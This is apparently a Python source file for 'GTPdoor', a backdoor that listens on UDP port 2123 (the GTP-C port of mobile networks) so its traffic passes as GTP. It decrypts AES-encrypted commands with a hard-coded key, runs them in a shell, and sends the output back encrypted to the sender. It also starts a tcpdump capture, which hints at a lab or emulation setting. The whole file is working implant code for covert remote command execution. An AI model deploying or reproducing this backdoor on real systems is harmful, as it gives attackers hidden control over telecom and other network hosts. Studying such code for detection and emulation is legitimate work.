import socket
import subprocess
import time
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

import logging

PCAP_FILE = f"/tmp/gtpdoor_session_{int(time.time())}.pcap"

# Start tcpdump
tcpdump = subprocess.Popen([
    "tcpdump", "-i", "any", f"udp port 2123", "-w", PCAP_FILE
], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
logging.info(f"[+] Started tcpdump → {PCAP_FILE}")

# Pre-shared AES key (32 bytes for AES-256)
AES_KEY = b"MySecretGTPDoorKey2024!@#$%^&*()"  # 32 bytes exactly

def encrypt_payload(plaintext):
    """Encrypt payload using AES-256-CBC"""
    try:
        # Generate random IV
        iv = get_random_bytes(16)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        
        # Pad and encrypt
        padded_data = pad(plaintext.encode('utf-8'), AES.block_size)
        encrypted_data = cipher.encrypt(padded_data)
        
        # Return IV + encrypted data, base64 encoded
        combined = iv + encrypted_data
        return base64.b64encode(combined).decode('utf-8')
    except Exception as e:
        print(f"[!] Encryption error: {e}")
        return None

def decrypt_payload(encrypted_data):
    """Decrypt payload using AES-256-CBC"""
    try:
        # Decode base64
        combined = base64.b64decode(encrypted_data.encode('utf-8'))
        
        # Extract IV and encrypted data
        iv = combined[:16]
        encrypted = combined[16:]
        
        # Decrypt
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        decrypted_padded = cipher.decrypt(encrypted)
        
        # Remove padding
        decrypted = unpad(decrypted_padded, AES.block_size)
        return decrypted.decode('utf-8')
    except Exception as e:
        print(f"[!] Decryption error: {e}")
        return None

def create_gtp_response(payload):
    """Create a GTP-like response packet with encrypted payload"""
    # Encrypt the payload first
    encrypted_payload = encrypt_payload(payload)
    if encrypted_payload is None:
        return None
        
    # GTP header (8 bytes) - modified to indicate response
    gtp_header = b"\x32\x02\x00\x00\x00\x00\x00\x00"
    return gtp_header + encrypted_payload.encode('utf-8')

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("0.0.0.0", 2123))
sock.settimeout(1.0)  # Add timeout to prevent blocking
print("[!] GTPdoor listening on UDP/2123 with AES-256 encryption")

while True:
    try:
        data, addr = sock.recvfrom(2048)
        print(f"[>] Received packet from {addr} ({len(data)} bytes)")
        
        # Extract payload (skip first 8 bytes which are GTP header)
        if len(data) < 8:
            print("[!] Packet too short, ignoring")
            continue
            
        encrypted_payload = data[8:].decode('utf-8', errors='ignore').strip()
        print(f"[*] Encrypted payload received ({len(encrypted_payload)} chars)")
        
        # Decrypt the payload
        payload = decrypt_payload(encrypted_payload)
        if payload is None:
            print("[!] Failed to decrypt payload, ignoring")
            continue
            
        print(f"[*] Decrypted payload: {repr(payload)}")
        
        if "GTPDOOR:" in payload:
            try:
                # Extract command after GTPDOOR:
                cmd_part = payload.split("GTPDOOR:", 1)[1]  # Use maxsplit=1 to handle colons in commands
                
                # Handle potential null bytes and clean up
                if "cmd:" in cmd_part:
                    cmd = cmd_part.split("cmd:", 1)[1]
                    cmd = cmd.encode('utf-8').split(b'\x00')[0].decode('utf-8').strip()
                    
                    print(f"[+] Executing: {cmd}")
                    
                    try:
                        # Execute command with timeout
                        result = subprocess.check_output(
                            cmd, 
                            shell=True, 
                            stderr=subprocess.STDOUT,
                            timeout=30  # 30 second timeout
                        ).decode('utf-8', errors='ignore')
                        
                        print(f"[<] Command executed successfully")
                        print(f"[<] Result preview: {result[:200]}...")
                        
                        # Send response back
                        response_payload = f"GTPDOOR:response:{cmd}:SUCCESS:\n{result}"
                        response_packet = create_gtp_response(response_payload)
                        
                        # Send response back to sender
                        sock.sendto(response_packet, addr)
                        print(f"[<] Response sent back to {addr}")
                        
                    except subprocess.TimeoutExpired:
                        error_msg = f"Command timed out after 30 seconds"
                        print(f"[!] {error_msg}")
                        response_payload = f"GTPDOOR:response:{cmd}:TIMEOUT:{error_msg}"
                        response_packet = create_gtp_response(response_payload)
                        if response_packet:
                            sock.sendto(response_packet, addr)
                        
                        
                    except subprocess.CalledProcessError as e:
                        error_msg = f"Command failed with exit code {e.returncode}: {e.output.decode('utf-8', errors='ignore') if e.output else 'No output'}"
                        print(f"[!] {error_msg}")
                        response_payload = f"GTPDOOR:response:{cmd}:ERROR:{error_msg}"
                        response_packet = create_gtp_response(response_payload)
                        if response_packet:
                            sock.sendto(response_packet, addr)
                        
                        
                    except Exception as e:
                        error_msg = f"Unexpected error: {str(e)}"
                        print(f"[!] {error_msg}")
                        response_payload = f"GTPDOOR:response:{cmd}:ERROR:{error_msg}"
                        response_packet = create_gtp_response(response_payload)
                        sock.sendto(response_packet, addr)
                        
                else:
                    print("[!] Invalid command format - missing 'cmd:' prefix")
                    response_payload = "GTPDOOR:response:INVALID:ERROR:Missing cmd: prefix"
                    response_packet = create_gtp_response(response_payload)
                    if response_packet:
                        sock.sendto(response_packet, addr)
                    
            except Exception as e:
                print(f"[!] Error parsing command: {e}")
                response_payload = f"GTPDOOR:response:PARSE_ERROR:ERROR:{str(e)}"
                response_packet = create_gtp_response(response_payload)
                if response_packet:
                    sock.sendto(response_packet, addr)
                
        else:
            print("[!] Not a GTPDOOR packet, ignoring")
            
    except socket.timeout:
        # Timeout is normal, just continue listening
        continue
    except KeyboardInterrupt:
        print("\n[*] Shutting down listener...")
        break
    except Exception as e:
        print(f"[!] Unexpected error in main loop: {e}")
        continue

sock.close()
print("[*] Listener stopped")
